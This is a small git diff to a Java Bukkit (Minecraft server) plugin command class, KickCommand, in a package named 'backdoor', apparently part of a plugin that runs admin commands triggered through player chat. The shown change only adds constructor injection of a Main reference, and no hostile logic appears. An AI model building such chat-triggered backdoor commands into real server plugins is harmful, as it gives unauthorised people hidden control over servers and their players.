@@ -2,6 +2,7 @@ package me.tsb.backdoor.commands.bans;
 
 import me.tsb.backdoor.Command;
 import me.tsb.backdoor.RegisterCommand;
+import me.tsb.plugin.Main;
 import org.bukkit.Bukkit;
 import org.bukkit.entity.Player;
 import org.bukkit.event.player.PlayerChatEvent;
@@ -10,6 +11,12 @@ import java.util.ArrayList;
 
 @RegisterCommand(displayName = "kick", aliases = {"kick"})
 public class KickCommand extends Command {
+
+    private final Main main;
+
+    public KickCommand (Main main) {
+        this.main = main;
+    }
 
     @Override
     public void onExec(PlayerChatEvent event, ArrayList<String> args) {
